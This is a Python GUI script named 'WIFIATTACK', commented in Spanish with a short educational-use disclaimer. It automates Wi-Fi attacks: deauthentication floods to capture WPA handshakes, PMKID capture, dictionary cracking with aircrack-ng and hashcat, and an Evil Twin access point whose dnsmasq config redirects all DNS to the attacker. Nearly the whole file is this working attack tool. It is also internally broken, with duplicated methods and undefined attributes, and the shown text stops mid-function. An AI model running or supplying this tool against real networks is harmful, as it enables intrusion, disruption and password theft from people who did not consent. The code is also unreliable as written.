#WIFIATTACK
# wifi_auditor_gui.py
#
# ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
# únicamente en redes para las que se tiene permiso explícito.

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import subprocess
import os
import sys
import threading
import queue
import time
import re
import csv
from datetime import timedelta

# --- Funciones de Backend (similares a la versión anterior pero adaptadas) ---
# <--- NUEVO: Diccionario de dependencias para una fácil verificación
REQUIRED_TOOLS = {
    "General": ["iw", "ifconfig", "iwconfig", "systemctl"],
    "Handshake": ["airodump-ng", "aireplay-ng", "aircrack-ng"],
    "PMKID": ["hcxdumptool", "hcxhashtool", "hashcat"],
    "Evil Twin": ["hostapd", "dnsmasq", "aireplay-ng"],
    "WPS": ["reaver"]
}


def check_root():
    """Verifica si el script se ejecuta como root y muestra un error si no."""
    if os.geteuid() != 0:
        messagebox.showerror("Error de Privilegios", 
                             "Este script requiere privilegios de superusuario (root).\n"
                             "Por favor, ejecútalo con 'sudo python3 wifi_auditor_gui.py'")
        sys.exit(1)

# <--- NUEVO: Función para verificar todas las herramientas necesarias
def check_dependencies():
    """Verifica que todas las herramientas necesarias estén instaladas."""
    missing_tools = []
    for category, tools in REQUIRED_TOOLS.items():
        for tool in tools:
            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
                missing_tools.append(tool)
    
    if missing_tools:
        messagebox.showwarning("Herramientas Faltantes",
                               "Las siguientes herramientas no se encontraron en tu sistema. "
                               "Por favor, instálalas para asegurar la funcionalidad completa:\n\n"
                               f"{', '.join(missing_tools)}")
    return not missing_tools

def find_wireless_interface():
    """Encuentra la primera interfaz inalámbrica en modo managed."""
    try:
        result = subprocess.check_output(['iw', 'dev'], stderr=subprocess.STDOUT).decode('utf-8')
        interfaces = re.findall(r'Interface\s+(\w+)', result)
        for iface in interfaces:
            # Asegurarse de que no sea una interfaz ya en modo monitor por otro proceso
            mode_result = subprocess.check_output(['iwconfig', iface], stderr=subprocess.STDOUT).decode('utf-8')
            if 'Mode:Managed' in mode_result:
                return iface
        return interfaces[0] if interfaces else None # Fallback por si no encuentra modo managed
    except Exception:
        return None

def set_monitor_mode(interface, log_queue):
    """Activa el modo monitor y reporta el progreso a la GUI."""
    log_queue.put(f"[*] Activando modo monitor en {interface}...")
    try:
        # Detener servicios que puedan interferir
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True, capture_output=True)
        # Activar modo monitor con airmon-ng para mayor compatibilidad
        proc = subprocess.run(['airmon-ng', 'start', interface], check=True, capture_output=True, text=True)
        
        # airmon-ng a menudo crea una nueva interfaz (ej. wlan0mon)
        new_interface_match = re.search(r'monitor mode enabled on\s*(\w+)', proc.stdout)
        if new_interface_match:
            new_iface = new_interface_match.group(1).strip()
            log_queue.put(f"[+] Modo monitor activado en la nueva interfaz: {new_iface}")
            return new_iface
        else: # Fallback al método manual si airmon-ng no reporta nueva interfaz
            subprocess.run(['ifconfig', interface, 'down'], check=True, capture_output=True)
            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True, capture_output=True)
            subprocess.run(['ifconfig', interface, 'up'], check=True, capture_output=True)
            log_queue.put(f"[+] Modo monitor activado en {interface}.")
            return interface
            
    except subprocess.CalledProcessError as e:
        log_queue.put(f"[!] ERROR: No se pudo activar el modo monitor.")
        log_queue.put(f"    Error: {e.stderr.decode() if e.stderr else 'Revisa si tu tarjeta es compatible.'}")
        return None
    
def stop_monitor_mode(interface, log_queue):
    """Desactiva el modo monitor."""
    log_queue.put("[*] Desactivando modo monitor...")
    try:
        # Usar airmon-ng para detener es más fiable
        subprocess.run(['airmon-ng', 'stop', interface], check=True, capture_output=True)
        log_queue.put(f"[+] Modo monitor desactivado en {interface}.")
        # Reiniciar el gestor de red para restaurar la conectividad
        subprocess.run(['systemctl', 'restart', 'NetworkManager'], check=False, capture_output=True)
        log_queue.put("[+] NetworkManager reiniciado.")
    except Exception as e:
        log_queue.put(f"[!] Advertencia: No se pudo restaurar la interfaz automáticamente. Puede que necesites hacerlo manualmente.")

# <--- NUEVO: Funciones para crear archivos de configuración para Evil Twin
def create_hostapd_conf(interface, essid, channel):
    conf_path = "/tmp/hostapd.conf"
    conf_content = (
        f"interface={interface}\n"
        f"driver=nl80211\n"
        f"ssid={essid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        "macaddr_acl=0\n"
        "auth_algs=1\n"
        "ignore_broadcast_ssid=0\n"
    )
    with open(conf_path, 'w') as f:
        f.write(conf_content)
    return conf_path

def create_dnsmasq_conf(interface):
    conf_path = "/tmp/dnsmasq.conf"
    conf_content = (
        f"interface={interface}\n"
        "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
        "dhcp-option=3,10.0.0.1\n"
        "dhcp-option=6,10.0.0.1\n"
        "server=8.8.8.8\n"
        "log-queries\n"
        "log-dhcp\n"
        "listen-address=127.0.0.1,10.0.0.1\n"
        # Redirigir todo a nosotros mismos (para un portal cautivo)
        "address=/#/10.0.0.1\n"
    )
    with open(conf_path, 'w') as f:
        f.write(conf_content)
    return conf_path


# --- Clase principal de la GUI ---

class WifiAuditorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WIFIATTACK")
        self.root.geometry("900x700")

        self.interface = None
        self.attack_thread = None
        self.stop_event = threading.Event()
        self.log_queue = queue.Queue()
        self.attack_start_time = None
        self.active_processes = []

        # --- Variables de estado ---
        self.attack_status = tk.StringVar(value="Inactivo")
        self.elapsed_time = tk.StringVar(value="00:00:00")
        self.current_attack_type = tk.StringVar(value="WPA Handshake") # Default attack type

        # --- Creación de Widgets ---
        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        # Iniciar el chequeo de la cola de logs
        self.process_log_queue()
        
        # Comprobaciones iniciales
        check_root()
        self.interface = find_wireless_interface()
        if not self.interface:
             self.log_message("[!] ERROR: No se encontró ninguna interfaz de red inalámbrica compatible.")
        else:
             self.log_message(f"[*] Interfaz inalámbrica encontrada: {self.interface}")


    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # --- Frame superior (Escaneo y Tabla) ---
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill=tk.X, pady=5)

        scan_frame = ttk.LabelFrame(top_frame, text="1. Escanear Redes", padding="10")
        scan_frame.pack(fill=tk.X)
        self.scan_button = ttk.Button(scan_frame, text="Escanear Redes Wi-Fi", command=self.start_scan_thread)
        self.scan_button.pack(side=tk.LEFT, padx=5)

        tree_frame = ttk.Frame(main_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.tree = ttk.Treeview(tree_frame, columns=("BSSID", "Channel", "Power", "WPS", "ESSID"), show="headings")
        self.tree.heading("BSSID", text="BSSID"); self.tree.column("BSSID", width=150)
        self.tree.heading("Channel", text="Canal"); self.tree.column("Channel", width=50)
        self.tree.heading("Power", text="Potencia"); self.tree.column("Power", width=60)
        self.tree.heading("WPS", text="WPS"); self.tree.column("WPS", width=40)
        self.tree.heading("ESSID", text="Nombre de Red (ESSID)")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        tree_scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        tree_scrollbar.pack(side=tk.RIGHT, fill="y")
        self.tree.configure(yscrollcommand=tree_scrollbar.set)
        
        # --- Frame de Ataques con Pestañas ---
        # <--- NUEVO: Uso de Notebook para organizar los ataques
        attack_notebook = ttk.Notebook(main_frame)
        attack_notebook.pack(fill=tk.X, pady=10)

        # Crear pestañas
        handshake_tab = ttk.Frame(attack_notebook, padding="10")
        pmkid_tab = ttk.Frame(attack_notebook, padding="10")
        evil_twin_tab = ttk.Frame(attack_notebook, padding="10")
        wps_tab = ttk.Frame(attack_notebook, padding="10")

        attack_notebook.add(handshake_tab, text="WPA Handshake")
        attack_notebook.add(pmkid_tab, text="PMKID")
        attack_notebook.add(evil_twin_tab, text="Evil Twin")
        attack_notebook.add(wps_tab, text="WPS Pixie-Dust")

        # --- Contenido de la Pestaña Handshake ---
        ttk.Label(handshake_tab, text="Red (BSSID):").grid(row=0, column=0, sticky=tk.W)
        self.hs_bssid = tk.StringVar()
        ttk.Entry(handshake_tab, textvariable=self.hs_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
        
        ttk.Label(handshake_tab, text="Canal:").grid(row=0, column=2, sticky=tk.W)
        self.hs_channel = tk.StringVar()
        ttk.Entry(handshake_tab, textvariable=self.hs_channel, state="readonly", width=5).grid(row=0, column=3, padx=5)

        ttk.Label(handshake_tab, text="Diccionario:").grid(row=1, column=0, pady=5, sticky=tk.W)
        self.hs_wordlist = tk.StringVar()
        ttk.Entry(handshake_tab, textvariable=self.hs_wordlist).grid(row=1, column=1, columnspan=3, padx=5, sticky=tk.EW)
        ttk.Button(handshake_tab, text="Buscar...", command=lambda: self.browse_wordlist(self.hs_wordlist)).grid(row=1, column=4, padx=5)
        ttk.Button(handshake_tab, text="INICIAR ATAQUE HANDSHAKE", command=lambda: self.start_attack("Handshake")).grid(row=2, column=0, columnspan=5, pady=10)
        handshake_tab.columnconfigure(1, weight=1)

        # --- Contenido de la Pestaña PMKID ---
        ttk.Label(pmkid_tab, text="Red (BSSID):").grid(row=0, column=0, sticky=tk.W)
        self.pmkid_bssid = tk.StringVar()
        ttk.Entry(pmkid_tab, textvariable=self.pmkid_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)

        ttk.Label(pmkid_tab, text="Diccionario:").grid(row=1, column=0, pady=5, sticky=tk.W)
        self.pmkid_wordlist = tk.StringVar()
        ttk.Entry(pmkid_tab, textvariable=self.pmkid_wordlist).grid(row=1, column=1, padx=5, sticky=tk.EW)
        ttk.Button(pmkid_tab, text="Buscar...", command=lambda: self.browse_wordlist(self.pmkid_wordlist)).grid(row=1, column=2, padx=5)
        ttk.Button(pmkid_tab, text="INICIAR ATAQUE PMKID", command=lambda: self.start_attack("PMKID")).grid(row=2, column=0, columnspan=3, pady=10)
        pmkid_tab.columnconfigure(1, weight=1)

        # --- Contenido de la Pestaña Evil Twin ---
        ttk.Label(evil_twin_tab, text="Red a Suplantar (ESSID):").grid(row=0, column=0, sticky=tk.W)
        self.et_essid = tk.StringVar()
        ttk.Entry(evil_twin_tab, textvariable=self.et_essid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
        
        ttk.Label(evil_twin_tab, text="BSSID Original:").grid(row=1, column=0, sticky=tk.W)
        self.et_bssid = tk.StringVar()
        ttk.Entry(evil_twin_tab, textvariable=self.et_bssid, state="readonly").grid(row=1, column=1, padx=5, sticky=tk.EW)

        ttk.Label(evil_twin_tab, text="Canal:").grid(row=1, column=2, sticky=tk.W)
        self.et_channel = tk.StringVar()
        ttk.Entry(evil_twin_tab, textvariable=self.et_channel, state="readonly", width=5).grid(row=1, column=3, padx=5)
        ttk.Button(evil_twin_tab, text="INICIAR EVIL TWIN", command=lambda: self.start_attack("Evil Twin")).grid(row=2, column=0, columnspan=4, pady=10)
        evil_twin_tab.columnconfigure(1, weight=1)

        # --- Contenido de la Pestaña WPS ---
        ttk.Label(wps_tab, text="Red con WPS (BSSID):").grid(row=0, column=0, sticky=tk.W)
        self.wps_bssid = tk.StringVar()
        ttk.Entry(wps_tab, textvariable=self.wps_bssid, state="readonly").grid(row=0, column=1, padx=5, sticky=tk.EW)
        ttk.Label(wps_tab, text="Nota: Selecciona una red con WPS 'Sí' en la tabla.").grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=5)
        ttk.Button(wps_tab, text="INICIAR ATAQUE WPS", command=lambda: self.start_attack("WPS")).grid(row=2, column=0, columnspan=2, pady=10)
        wps_tab.columnconfigure(1, weight=1)

        self.tree.bind("<<TreeviewSelect>>", self.on_network_select)


        # --- Frame de control y logs ---
        control_frame = ttk.Frame(main_frame, padding="10")
        control_frame.pack(fill=tk.X)

        self.stop_button = ttk.Button(control_frame, text="DETENER TODO", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=10)
        ttk.Label(control_frame, text="Estado:").pack(side=tk.LEFT, padx=(20, 5))
        ttk.Label(control_frame, textvariable=self.attack_status, font=("TkDefaultFont", 10, "bold")).pack(side=tk.LEFT)
        ttk.Label(control_frame, text="Tiempo Transcurrido:").pack(side=tk.LEFT, padx=(20, 5))
        ttk.Label(control_frame, textvariable=self.elapsed_time).pack(side=tk.LEFT)

        log_frame = ttk.LabelFrame(main_frame, text="Registro de Actividad", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state="disabled", height=10, bg="black", fg="limegreen")
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
    def on_network_select(self, event):
        """Cuando el usuario selecciona una red, rellena los campos de todas las pestañas."""
        selected_item = self.tree.focus()
        if not selected_item: return
        
        item = self.tree.item(selected_item)
        bssid, channel, _, wps, essid = item['values']
        
        # Rellenar todas las pestañas
        self.hs_bssid.set(bssid)
        self.hs_channel.set(channel)
        self.pmkid_bssid.set(bssid)
        self.et_essid.set(essid)
        self.et_bssid.set(bssid)
        self.et_channel.set(channel)
        
        if wps == "Sí":
            self.wps_bssid.set(bssid)
        else:
            self.wps_bssid.set("") # Limpiar si la red no tiene WPS

    def log_message(self, message):
        """Añade un mensaje a la caja de texto de logs de forma segura."""
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.config(state="disabled")
        self.log_text.see(tk.END) # Auto-scroll

    def update_attack_status(self, status):
        """Actualiza el estado del ataque en la GUI."""
        self.attack_status.set(status)

    def update_elapsed_time(self):
        """Actualiza el tiempo transcurrido desde el inicio del ataque."""
        if self.attack_start_time and not self.stop_event.is_set():
            delta = timedelta(seconds=int(time.time() - self.attack_start_time))
            self.elapsed_time.set(str(delta))
            self.root.after(1000, self.update_elapsed_time) # Actualizar cada segundo

    def process_log_queue(self):
        """Procesa mensajes de la cola y actualiza la GUI."""
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_message(message)
        except queue.Empty:
            pass
        self.root.after(100, self.process_log_queue)

    def start_scan_thread(self):
        """Inicia el escaneo de redes en un hilo separado para no congelar la GUI."""
        self.scan_button.config(state=tk.DISABLED)
        self.update_attack_status("Escaneando redes...")
        self.log_message("[*] Iniciando escaneo de redes durante 20 segundos...")
        scan_thread = threading.Thread(target=self.scan_networks)
        scan_thread.start()

    def scan_networks(self):
        if not self.base_interface:
            self.log_queue.put("[!] No hay interfaz para escanear.")
            self.scan_button.config(state=tk.NORMAL)
            self.update_attack_status("Error de Interfaz")
            return

        mon_iface = set_monitor_mode(self.base_interface, self.log_queue)
        if not mon_iface:
            self.scan_button.config(state=tk.NORMAL)
            self.update_attack_status("Error al escanear")
            return

        for i in self.tree.get_children(): self.tree.delete(i)
        
        output_prefix = "/tmp/scan_result"
        for f in os.listdir('/tmp/'):
            if f.startswith("scan_result"): os.remove(f"/tmp/{f}")

        command = ['airodump-ng', '-w', output_prefix, '--output-format', 'csv', '--wps', mon_iface]
        try:
            proc = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(20)
            proc.terminate()
            proc.wait()
        except FileNotFoundError:
            self.log_queue.put("[!] ERROR: 'airodump-ng' no encontrado.")
            self.scan_button.config(state=tk.NORMAL)
            self.update_attack_status("Error de herramienta")
            stop_monitor_mode(mon_iface, self.log_queue)
            return
        
        try:
            csv_filename = f"{output_prefix}-01.csv"
            with open(csv_filename, 'r', errors='ignore') as f:
                reader = csv.reader(f)
                for row in reader:
                    if row and "BSSID" in row[0]: break
                for row in reader:
                    if len(row) < 14 or not row[0].strip(): break
                    bssid = row[0].strip()
                    power = row[8].strip()
                    channel = row[3].strip()
                    encryption = row[5].strip()
                    wps = "Sí" if "WPS" in encryption else "No"
                    essid = row[13].strip()
                    if essid:
                        self.tree.insert("", "end", values=(bssid, channel, power, wps, essid))
            self.log_queue.put("[+] Escaneo completado. Selecciona una red.")
        except FileNotFoundError:
            self.log_queue.put("[!] No se generó el archivo de escaneo.")
        except Exception as e:
            self.log_queue.put(f"[!] Error al leer el resultado del escaneo: {e}")
        finally:
            self.scan_button.config(state=tk.NORMAL)
            self.update_attack_status("Escaneo completado")
            stop_monitor_mode(mon_iface, self.log_queue)

    def on_network_select(self, event):
        """Cuando el usuario selecciona una red, rellena los campos de ataque."""
        selected_item = self.tree.focus()
        if selected_item:
            item = self.tree.item(selected_item)
            bssid, channel, _, _ = item['values']
            self.target_bssid.set(bssid)
            self.target_channel.set(channel)

    def browse_wordlist(self):
        """Abre un diálogo para seleccionar el archivo de diccionario."""
        filepath = filedialog.askopenfilename(title="Selecciona un Diccionario",
                                              filetypes=(("Archivos de Texto", "*.txt"), ("Todos los archivos", "*.*")))
        if filepath:
            self.wordlist_path.set(filepath)

    def start_attack(self, attack_type):
        # Validaciones
        if attack_type == "Handshake":
            if not all([self.hs_bssid.get(), self.hs_channel.get(), self.hs_wordlist.get()]):
                messagebox.showwarning("Faltan Datos", "Selecciona una red y un diccionario.")
                return
        elif attack_type == "PMKID":
            if not all([self.pmkid_bssid.get(), self.pmkid_wordlist.get()]):
                messagebox.showwarning("Faltan Datos", "Selecciona una red y un diccionario.")
                return
        elif attack_type == "Evil Twin":
            if not all([self.et_bssid.get(), self.et_essid.get(), self.et_channel.get()]):
                messagebox.showwarning("Faltan Datos", "Selecciona una red de la lista.")
                return
        elif attack_type == "WPS":
            if not self.wps_bssid.get():
                messagebox.showwarning("Faltan Datos", "Selecciona una red con WPS activado.")
                return
        
        self.stop_event.clear()
        self.stop_button.config(state=tk.NORMAL)
        self.scan_button.config(state=tk.DISABLED)
        self.attack_start_time = time.time()
        self.update_elapsed_time()

        # Seleccionar la función de ataque correcta
        target_function = {
            "Handshake": self.run_handshake_attack_sequence,
            "PMKID": self.run_pmkid_attack_sequence,
            "Evil Twin": self.run_evil_twin_sequence,
            "WPS": self.run_wps_attack_sequence
        }[attack_type]

        self.attack_thread = threading.Thread(target=target_function)
        self.attack_thread.start()

    def stop_attack(self):
        self.log_message("[!] Solicitud de detención enviada. Limpiando...")
        self.stop_event.set()
        self.stop_button.config(state=tk.DISABLED)
        self.update_attack_status("Deteniendo...")
        # <--- NUEVO: Detener todos los procesos activos
        for proc in self.active_processes:
            try:
                proc.terminate()
            except ProcessLookupError:
                pass # El proceso ya terminó
        self.active_processes.clear()

    #NUEVO: Funciones para crear archivos de configuración para Evil Twin
    def attack_finished(self):
        """Reactiva los botones y resetea el estado cuando el ataque termina."""
        self.stop_button.config(state=tk.DISABLED)
        self.scan_button.config(state=tk.NORMAL)
        self.attack_start_time = None
        if "ÉXITO" not in self.attack_status.get() and "Error" not in self.attack_status.get() and "detenido" not in self.attack_status.get():
            self.update_attack_status("Inactivo")
        self.elapsed_time.set("00:00:00")

    def on_closing(self):
        """Maneja el cierre de la ventana."""
        self.stop_event.set()
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        if self.monitor_interface:
            stop_monitor_mode(self.monitor_interface, self.log_queue)
        self.root.destroy()

    def check_tool_exists(self, tool_name):
        """Verifica si una herramienta específica existe en el PATH."""
        return subprocess.run(['which', tool_name], capture_output=True).returncode == 0

    def run_handshake_attack_sequence(self, bssid, channel, wordlist):
        """
        Esta es la función principal que se ejecuta en el hilo separado para ataque WPA Handshake.
        Orquesta toda la secuencia de ataque.
        """
        bssid = self.hs_bssid.get()
        channel = self.hs_channel.get()
        wordlist = self.hs_wordlist.get()

        self.update_attack_status("Activando modo monitor...")
        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
        if not self.monitor_interface or self.stop_event.is_set():
            self.attack_finished()
            return
        
        try:
            self.log_queue.put("\n--- FASE 1: Capturando Handshake ---")
            self.update_attack_status("Buscando Handshake...")
            capture_file = f"/tmp/{bssid.replace(':', '')}_capture"
            
            airodump_cmd = ['airodump-ng', '--bssid', bssid, '--channel', channel, '-w', capture_file, self.monitor_interface]
            airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.active_processes.append(airodump_proc)

            aireplay_cmd = ['aireplay-ng', '--deauth', '0', '-a', bssid, self.monitor_interface]
            aireplay_proc = subprocess.Popen(aireplay_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(aireplay_proc)
            
            handshake_found = False
            while not handshake_found and not self.stop_event.is_set():
                line = airodump_proc.stdout.readline()
                if not line: break
                if "WPA handshake:" in line:
                    self.log_queue.put("\n[+] ¡HANDSHAKE CAPTURADO!\n")
                    handshake_found = True
                time.sleep(0.1)

            # Detener captura y deauth
            aireplay_proc.terminate(); airodump_proc.terminate()
            self.active_processes.clear()

            if handshake_found and not self.stop_event.is_set():
                self.log_queue.put("\n--- FASE 2: Crackeando Contraseña ---")
                self.update_attack_status("Crackeando Handshake...")
                
                aircrack_cmd = ['aircrack-ng', '-w', wordlist, '-b', bssid, f"{capture_file}-01.cap"]
                result = subprocess.run(aircrack_cmd, capture_output=True, text=True)
                
                self.log_queue.put(result.stdout)
                if "KEY FOUND!" in result.stdout:
                     password = re.search(r'KEY FOUND!\s+\[\s*(.*)\s*\]', result.stdout).group(1)
                     self.log_queue.put(f"\n[*****] ¡ÉXITO! Contraseña: {password} [*****]\n")
                     self.update_attack_status(f"ÉXITO: {password}")
                else:
                    self.log_queue.put("[!] Contraseña no encontrada en el diccionario.")
                    self.update_attack_status("Contraseña no encontrada")
            elif not self.stop_event.is_set():
                self.log_queue.put("[!] No se pudo capturar el handshake.")
                self.update_attack_status("Fallo al capturar Handshake")

        finally:
            stop_monitor_mode(self.monitor_interface, self.log_queue)
            self.attack_finished()
            self.monitor_interface = None

    def run_pmkid_attack_sequence(self, bssid, channel, wordlist):
        """
        Función para el ataque PMKID utilizando hcxdumptool y hashcat.
        """
        self.update_attack_status("Activando modo monitor (PMKID)...")
        if not set_monitor_mode(self.interface, self.log_queue):
            self.attack_finished()
            return

        pmkid_file_cap = "pmkid_capture.pcap"
        pmkid_file_hash = "pmkid_hash.hc22000" # Hashcat mode 22000 for WPA-EAPOL-PMKID

        # Clean up previous files
        for f in [pmkid_file_cap, pmkid_file_hash]:
            if os.path.exists(f):
                os.remove(f)

        hcxdumptool_proc = None
        try:
            self.log_queue.put("\n--- FASE 1: Capturando PMKID ---")
            self.log_queue.put(f"[*] Escuchando PMKID de {bssid} en el canal {channel}...")
            self.update_attack_status("Buscando PMKID...")

            # Command to capture PMKID
            # -i interface, -o output.pcapng, --enable_status=1 to show live status (optional)
            # -b bssid (optional, for specific target)
            hcxdumptool_cmd = ['hcxdumptool', '-i', self.interface, '-o', pmkid_file_cap, '--enable_status=1']
            if bssid:
                hcxdumptool_cmd.extend(['--filterlist_ap', bssid, '--filterlist_ap_mode', '2']) # Mode 2: only specified APs
            
            # Use subprocess.Popen for non-blocking execution
            hcxdumptool_proc = subprocess.Popen(hcxdumptool_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            pmkid_found = False
            start_time = time.time()
            timeout = 60 # Try to capture for 60 seconds

            while not pmkid_found and not self.stop_event.is_set() and (time.time() - start_time < timeout):
                line = hcxdumptool_proc.stdout.readline()
                if not line:
                    break
                self.log_queue.put(line.strip())
                if "PMKID(s) written" in line or "AP-PMKID" in line: # hcxdumptool output might vary
                    self.log_queue.put("\n[+] ¡PMKID CAPTURADO (potencialmente)! Convirtiendo a formato Hashcat...")
                    pmkid_found = True
                time.sleep(0.1)
            
            if not pmkid_found:
                self.log_queue.put("[!] No se capturó PMKID en el tiempo de espera.")
                self.update_attack_status("Fallo al capturar PMKID")
                return

        finally:
            if hcxdumptool_proc:
                hcxdumptool_proc.terminate()
                hcxdumptool_proc.wait(timeout=5)

        # Convert .pcap to hashcat format
        if os.path.exists(pmkid_file_cap) and not self.stop_event.is_set():
            self.log_queue.put(f"[*] Convirtiendo '{pmkid_file_cap}' a formato hashcat...")
            try:
                subprocess.run(['hcxhashtool', '-o', pmkid_file_hash, '-i', pmkid_file_cap], check=True, capture_output=True, text=True)
                self.log_queue.put(f"[+] Archivo de hash guardado como '{pmkid_file_hash}'.")
                self.update_attack_status("PMKID capturado. Crackeando...")
            except subprocess.CalledProcessError as e:
                self.log_queue.put(f"[!] ERROR al convertir PMKID: {e.stderr}")
                self.update_attack_status("Error de conversión PMKID")
                stop_monitor_mode(self.interface, self.log_queue)
                self.attack_finished()
                return
            except FileNotFoundError:
                self.log_queue.put("[!] ERROR: 'hcxhashtool' no encontrado. Asegúrate de que está instalado.")
                self.update_attack_status("Error de herramienta")
                stop_monitor_mode(self.interface, self.log_queue)
                self.attack_finished()
                return
        else:
            self.log_queue.put("[!] Archivo .pcap de PMKID no encontrado o ataque detenido.")
            stop_monitor_mode(self.interface, self.log_queue)
            self.attack_finished()
            return

        # Start cracking with hashcat
        if os.path.exists(pmkid_file_hash) and not self.stop_event.is_set():
            self.log_queue.put("\n--- FASE 2: Crackeando PMKID con Hashcat ---")
            self.log_queue.put(f"[*] Iniciando ataque de diccionario con '{wordlist}' en hashcat (modo 22000)...")
            self.update_attack_status("Crackeando PMKID...")

            # Hashcat command: -m 22000 for WPA-EAPOL-PMKID, -a 0 for straight attack, -w wordlist, hashfile
            hashcat_cmd = ['hashcat', '-m', '22000', '-a', '0', '-w', '3', pmkid_file_hash, wordlist] # -w 3 for high performance
            
            try:
                # Use Popen to allow stopping
                hashcat_proc = subprocess.Popen(hashcat_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                
                found_key = None
                while not self.stop_event.is_set():
                    line = hashcat_proc.stdout.readline()
                    if not line:
                        break
                    self.log_queue.put(line.strip())
                    if "Cracked" in line or "HASH:PASS" in line: # Look for hashcat output indicating a crack
                        # Attempt to parse the cracked password from the line
                        match = re.search(r'[^:]*:(.*)', line) # Capture anything after the last colon
                        if match:
                            found_key = match.group(1).strip()
                            if found_key: # Ensure it's not empty
                                self.log_queue.put("==========================================")
                                self.log_queue.put(f"    ¡ÉXITO! Contraseña encontrada: {found_key}")
                                self.log_queue.put("==========================================")
                                self.update_attack_status(f"ÉXITO: {found_key}")
                                break # Stop reading output once found
                
                hashcat_proc.terminate()
                hashcat_proc.wait(timeout=5)

                if not found_key:
                    self.log_queue.put("[!] Contraseña no encontrada en el diccionario (Hashcat).")
                    self.update_attack_status("Contraseña no encontrada")

            except FileNotFoundError:
                self.log_queue.put("[!] ERROR: 'hashcat' no encontrado. Asegúrate de que está instalado.")
                self.update_attack_status("Error de herramienta")
            except Exception as e:
                self.log_queue.put(f"[!] Error durante el ataque con Hashcat: {e}")
                self.update_attack_status("Error de Hashcat")
        elif self.stop_event.is_set():
            self.log_queue.put("[*] El ataque PMKID fue detenido por el usuario.")
            self.update_attack_status("Ataque detenido")
        else:
            self.log_queue.put("[!] Archivo de hash PMKID no encontrado.")
            self.update_attack_status("Fallo de PMKID")

        stop_monitor_mode(self.interface, self.log_queue)
        self.attack_finished()

    # <--- NUEVO: Secuencia de ataque PMKID completa
    def run_pmkid_attack_sequence(self):
        bssid = self.pmkid_bssid.get()
        wordlist = self.pmkid_wordlist.get()

        self.update_attack_status("Activando modo monitor (PMKID)...")
        self.monitor_interface = set_monitor_mode(self.base_interface, self.log_queue)
        if not self.monitor_interface or self.stop_event.is_set():
            self.attack_finished()
            return
        
        pmkid_cap = "/tmp/pmkid_capture.pcapng"
        pmkid_hash = "/tmp/pmkid_hash.22000"

        try:
            self.log_queue.put("\n--- FASE 1: Capturando PMKID ---")
            self.update_attack_status("Buscando PMKID...")
            
            hcx_cmd = ['hcxdumptool', '-i', self.monitor_interface, '-o', pmkid_cap, '--enable_status=1', f'--bssid={bssid}']
            hcx_proc = subprocess.Popen(hcx_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.active_processes.append(hcx_proc)
            
            pmkid_found = False
            timeout = time.time() + 45 # Intentar por 45 segundos
            while not pmkid_found and not self.stop_event.is_set() and time.time() < timeout:
                line = hcx_proc.stdout.readline()
                if not line: break
                self.log_queue.put(line.strip())
                if "FOUND PMKID" in line.upper():
                    self.log_queue.put("\n[+] ¡PMKID CAPTURADO!\n")
                    pmkid_found = True
                time.sleep(0.1)
            
            hcx_proc.terminate()
            self.active_processes.clear()

            if pmkid_found and not self.stop_event.is_set():
                self.log_queue.put("[*] Convirtiendo captura a formato hashcat...")
                subprocess.run(['hcxhashtool', '-i', pmkid_cap, '-o', pmkid_hash], capture_output=True)
                
                if os.path.exists(pmkid_hash) and os.path.getsize(pmkid_hash) > 0:
                    self.log_queue.put("\n--- FASE 2: Crackeando PMKID con Hashcat ---")
                    self.update_attack_status("Crackeando PMKID...")

                    hashcat_cmd = ['hashcat', '-m', '22000', pmkid_hash, wordlist, '--force']
                    hashcat_proc = subprocess.Popen(hashcat_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    self.active_processes.append(hashcat_proc)

                    while not self.stop_event.is_set():
                        line = hashcat_proc.stdout.readline()
                        if not line: break
                        self.log_queue.put(line.strip())
                        if "Cracked" in line: break # Hashcat indica que terminó
                    
                    hashcat_proc.terminate()
                    self.active_processes.clear()
                    
                    # Comprobar resultado
                    show_cmd = ['hashcat', '-m', '22000', pmkid_hash, '--show']
                    result = subprocess.run(show_cmd, capture_output=True, text=True)
                    if ":" in result.stdout:
                        password = result.stdout.split(':')[-1].strip()
                        self.log_queue.put(f"\n[*****] ¡ÉXITO! Contraseña: {password} [*****]\n")
                        self.update_attack_status(f"ÉXITO: {password}")
                    else:
